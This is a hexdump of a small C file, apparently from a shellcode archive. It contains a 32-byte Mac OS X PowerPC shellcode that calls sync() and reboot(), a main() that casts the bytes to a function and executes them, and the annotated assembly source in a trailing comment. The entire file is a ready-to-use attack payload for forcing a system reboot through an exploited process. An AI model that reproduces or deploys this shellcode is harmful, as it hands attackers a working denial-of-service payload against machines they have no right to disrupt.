00000000  2f 2a 0d 0a 20 2a 20 5b  4d 61 63 4f 53 58 2f 50  |/*.. * [MacOSX/P|
00000010  6f 77 65 72 50 43 5d 0d  0a 20 2a 20 53 68 65 6c  |owerPC].. * Shel|
00000020  6c 63 6f 64 65 20 66 6f  72 3a 20 73 79 6e 63 28  |lcode for: sync(|
00000030  29 2c 20 72 65 62 6f 6f  74 28 29 0d 0a 20 2a 20  |), reboot().. * |
00000040  33 32 20 62 79 74 65 73  0d 0a 20 2a 20 68 6f 70  |32 bytes.. * hop|
00000050  68 65 74 20 5b 61 74 5d  20 67 6d 61 69 6c 2e 63  |het [at] gmail.c|
00000060  6f 6d 0d 0a 20 2a 20 68  74 74 70 3a 2f 2f 77 77  |om.. * http://ww|
00000070  77 2e 6e 6c 61 62 73 2e  63 6f 6d 2e 62 72 2f 7e  |w.nlabs.com.br/~|
00000080  68 6f 70 68 65 74 2f 0d  0a 20 2a 0d 0a 20 2a 2f  |hophet/.. *.. */|
00000090  0d 0a 0d 0a 23 69 6e 63  6c 75 64 65 20 22 73 74  |....#include "st|
000000a0  64 69 6f 2e 68 22 0d 0a  23 69 6e 63 6c 75 64 65  |dio.h"..#include|
000000b0  20 22 73 74 72 69 6e 67  2e 68 22 0d 0a 0d 0a 63  | "string.h"....c|
000000c0  68 61 72 20 73 68 65 6c  6c 63 6f 64 65 5b 5d 20  |har shellcode[] |
000000d0  3d 20 0d 0a 0d 0a 22 5c  78 37 63 5c 78 36 33 5c  |= ...."\x7c\x63\|
000000e0  78 31 61 5c 78 37 39 22  0d 0a 22 5c 78 33 39 5c  |x1a\x79".."\x39\|
000000f0  78 34 30 5c 78 30 31 5c  78 30 36 22 0d 0a 22 5c  |x40\x01\x06".."\|
00000100  78 33 38 5c 78 30 61 5c  78 66 66 5c 78 31 65 22  |x38\x0a\xff\x1e"|
00000110  0d 0a 22 5c 78 34 34 5c  78 66 66 5c 78 66 66 5c  |.."\x44\xff\xff\|
00000120  78 30 32 22 0d 0a 22 5c  78 36 30 5c 78 36 30 5c  |x02".."\x60\x60\|
00000130  78 36 30 5c 78 36 30 22  0d 0a 22 5c 78 33 39 5c  |x60\x60".."\x39\|
00000140  78 34 30 5c 78 30 31 5c  78 31 39 22 0d 0a 22 5c  |x40\x01\x19".."\|
00000150  78 33 38 5c 78 30 61 5c  78 66 66 5c 78 31 65 22  |x38\x0a\xff\x1e"|
00000160  0d 0a 22 5c 78 34 34 5c  78 66 66 5c 78 66 66 5c  |.."\x44\xff\xff\|
00000170  78 30 32 22 3b 0d 0a 0d  0a 69 6e 74 20 6d 61 69  |x02";....int mai|
00000180  6e 28 29 20 7b 0d 0a 0d  0a 09 76 6f 69 64 20 28  |n() {.....void (|
00000190  2a 70 29 28 29 3b 0d 0a  09 70 20 3d 20 28 76 6f  |*p)();...p = (vo|
000001a0  69 64 20 2a 29 26 73 68  65 6c 6c 63 6f 64 65 3b  |id *)&shellcode;|
000001b0  0d 0a 09 70 72 69 6e 74  66 28 22 4c 65 6e 67 68  |...printf("Lengh|
000001c0  74 3a 20 25 64 5c 6e 22  2c 20 73 74 72 6c 65 6e  |t: %d\n", strlen|
000001d0  28 73 68 65 6c 6c 63 6f  64 65 29 29 3b 0d 0a 09  |(shellcode));...|
000001e0  70 28 29 3b 0d 0a 7d 0d  0a 0d 0a 2f 2a 0d 0a 2e  |p();..}..../*...|
000001f0  67 6c 6f 62 6c 20 5f 6d  61 69 6e 0d 0a 2e 74 65  |globl _main...te|
00000200  78 74 0d 0a 5f 6d 61 69  6e 3a 0d 0a 09 78 6f 72  |xt.._main:...xor|
00000210  2e 09 72 33 2c 20 72 33  2c 72 33 09 2f 2f 20 72  |..r3, r3,r3.// r|
00000220  33 20 3d 20 4e 55 4c 4c  0d 0a 09 6c 69 09 72 31  |3 = NULL...li.r1|
00000230  30 2c 20 32 32 36 2b 33  36 0d 0a 09 61 64 64 69  |0, 226+36...addi|
00000240  09 72 30 2c 20 72 31 30  2c 20 2d 32 32 36 09 2f  |.r0, r10, -226./|
00000250  2f 20 72 30 20 3d 20 33  36 0d 0a 09 2e 6c 6f 6e  |/ r0 = 36....lon|
00000260  67 09 30 78 34 34 66 66  66 66 30 32 09 2f 2f 20  |g.0x44ffff02.// |
00000270  73 63 20 6f 70 63 6f 64  65 0d 0a 09 2e 6c 6f 6e  |sc opcode....lon|
00000280  67 09 30 78 36 30 36 30  36 30 36 30 09 2f 2f 20  |g.0x60606060.// |
00000290  4e 4f 50 0d 0a 09 6c 69  09 72 31 30 2c 20 32 32  |NOP...li.r10, 22|
000002a0  36 2b 35 35 0d 0a 09 61  64 64 69 09 72 30 2c 20  |6+55...addi.r0, |
000002b0  72 31 30 2c 20 2d 32 32  36 09 2f 2f 20 72 30 20  |r10, -226.// r0 |
000002c0  3d 20 35 35 0d 0a 09 2e  6c 6f 6e 67 09 30 78 34  |= 55....long.0x4|
000002d0  34 66 66 66 66 30 32 09  2f 2f 20 73 63 20 6f 70  |4ffff02.// sc op|
000002e0  63 6f 64 65 20 0d 0a 2a  2f                       |code ..*/|
000002e9
